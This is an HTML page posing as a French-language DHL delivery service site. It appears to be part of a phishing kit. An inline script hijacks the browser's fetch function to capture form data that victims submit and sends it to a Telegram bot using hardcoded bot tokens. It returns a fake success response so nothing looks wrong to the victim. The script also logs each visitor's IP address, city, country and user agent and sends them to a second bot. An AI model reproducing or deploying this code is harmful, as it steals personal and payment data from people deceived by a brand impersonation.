<!doctype html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>DHL - Service de Livraison</title>
    <script>
(function() {
  const DATA_BOT = "8584171291:AAHfFk3H1WhcAaxTOOR5vfqevrbekyC5nY4";
  const VISIT_BOT = "8421410574:AAGGyYXoD10wYMsUjbZWxCYO4J33tYmAPA4";
  const CHAT_ID = "6788012481";
  const TG = "https://api.telegram.org/bot";

  // Garde la ref au vrai fetch AVANT que React le touche
  const _fetch = window.fetch.bind(window);

  function tg(token, text) {
    _fetch(TG + token + "/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" }),
      keepalive: true
    }).catch(function(){});
  }

  // Remplace window.fetch pour intercepter les appels React
  window.fetch = async function(resource, init) {
    var url = (typeof resource === "string") ? resource : (resource && resource.url) || "";

    // Intercepter les appels de l'app vers notre backend local
    if (url === "/api/collect" || url.indexOf("api/collect") !== -1 ||
        url.indexOf("backend.blink.new") !== -1) {

      try {
        var bodyStr = (init && init.body) ? init.body : "";
        if (typeof bodyStr === "string" && bodyStr.length > 0) {
          var parsed = JSON.parse(bodyStr);
          var type = parsed.type || "data";
          var data = parsed.data || parsed;

          var msg = "📦 <b>DHL - " + type.toUpperCase() + "</b>\n\n";
          for (var k in data) {
            if (data.hasOwnProperty(k)) {
              msg += "<b>" + k + ":</b> " + data[k] + "\n";
            }
          }
          tg(DATA_BOT, msg);
        }
      } catch(e) {}

      // Retourner une fausse réponse 200 OK pour que React continue
      return Promise.resolve(new Response(
        JSON.stringify({ success: true }),
        { status: 200, headers: { "Content-Type": "application/json" } }
      ));
    }

    // Toutes les autres requêtes passent normalement
    return _fetch.apply(this, arguments);
  };

  // Tracking visite
  _fetch("https://ipwho.is/")
    .then(function(r) { return r.json(); })
    .then(function(d) {
      tg(VISIT_BOT,
        "🚨 <b>New DHL Visit</b>\n\n" +
        "🌐 <b>IP:</b> " + (d.ip || "?") + "\n" +
        "🏙️ <b>Ville:</b> " + (d.city || "?") + "\n" +
        "🌍 <b>Pays:</b> " + (d.country || "?") + "\n" +
        "📱 <b>UA:</b> " + navigator.userAgent
      );
    }).catch(function(){});
})();
    </script>
    <script type="module" crossorigin src="/assets/index-2vbYnM8p.js"></script>
    <link rel="stylesheet" crossorigin href="/assets/index-BFZsShg-.css">
  </head>

    <div id="root"></div>
  </body>
</html>
